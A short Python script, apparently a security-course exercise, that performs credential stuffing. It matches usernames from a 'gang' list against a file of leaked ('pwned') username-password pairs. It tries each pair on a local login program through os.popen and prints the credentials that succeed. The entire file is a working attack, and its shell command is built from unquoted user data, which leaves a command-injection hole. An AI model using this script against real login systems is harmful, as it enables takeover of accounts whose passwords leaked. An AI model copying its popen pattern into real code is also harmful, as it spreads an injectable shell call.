import os
from datetime import datetime

def findPass():
    start = datetime.now()
    gang = open("gang", "r")
    gangLines = gang.readlines()
    passwords = open("PwnedPWfile", "r")
    passwordsLines = passwords.readlines()
    for member in gangLines:
        for line in passwordsLines:
            line = line.split(',')
            line[1] = line[1].strip()
            if line[0] in member:
                res = os.popen("python3 Login.pyc {} {}".format(line[0], line[1])).read()
                if res.strip() == "Login successful.":
                    print("Login successful. \n\nUsername: {} \nPassword: {}".format(line[0], line[1]))

    end = datetime.now()
    print("\n\nStart time: {}".format(start.strftime("%H:%M:%S")))
    print("End time: {}".format(end.strftime("%H:%M:%S")))

findPass()
